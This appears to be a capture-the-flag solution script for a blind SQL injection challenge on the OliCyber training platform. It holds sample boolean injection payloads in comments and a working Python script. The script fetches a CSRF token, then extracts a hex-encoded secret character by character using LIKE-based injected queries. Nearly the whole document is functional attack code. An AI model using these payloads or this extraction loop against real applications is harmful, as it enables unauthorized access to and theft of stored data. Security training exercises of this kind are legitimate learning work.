## Queries:

## Check if query works

# 1' AND (SELECT 1 WHERE 1=1)='1

## Check character in first position of SECRET

# 1' AND (SELECT 1 WHERE HEX('SECRET') LIKE '5%')='1

## Check inside the correct column

# 1' AND (SELECT 1 FROM secret WHERE HEX(asecret) LIKE 'guess%')='

"""
Problem: Web 19 - SQLi 3: Blind SQL Injection

Category: Web Security

Description: Get the flag by checking every char

Algorith:
- Check every character to find the correct one using the 'LIKE' operator
- Print the result when characters are finished
- When the flag is printed, the program will finish automatically

"""

import requests

class Inj:
    def __init__(self, host):

        self.sess = requests.Session() # Start the session. We want to save the cookies
        self.base_url = '{}/api/'.format(host)
        self._refresh_csrf_token() # Refresh the ANTI-CSRF token

    def _refresh_csrf_token(self):
        resp = self.sess.get(self.base_url + 'get_token')
        resp = resp.json()
        self.token = resp['token']

    def _do_raw_req(self, url, query):
        headers = {'X-CSRFToken': self.token}
        data = {'query': query }
        return self.sess.post(url,json=data, headers=headers).json()

    def logic(self, query):
        url = self.base_url + 'logic'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def union(self, query):
        url = self.base_url + 'union'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def blind(self, query):
        url = self.base_url + 'blind'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def time(self, query):
        url = self.base_url + 'time'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

inj = Inj('http://web-17.challs.olicyber.it')

dictionary = '0123456789abcdef'
result = ''

while True:
    for c in dictionary:
        question = f"1' and (select 1 from secret where HEX(asecret) LIKE '{result+c}%')='1"
        response, error = inj.blind(question)
        if response == 'Success': # We have a match!
            result += c
            break
    else:
        # when characters are finished
        break
    print(result)

# Cyber Chef --> From Hex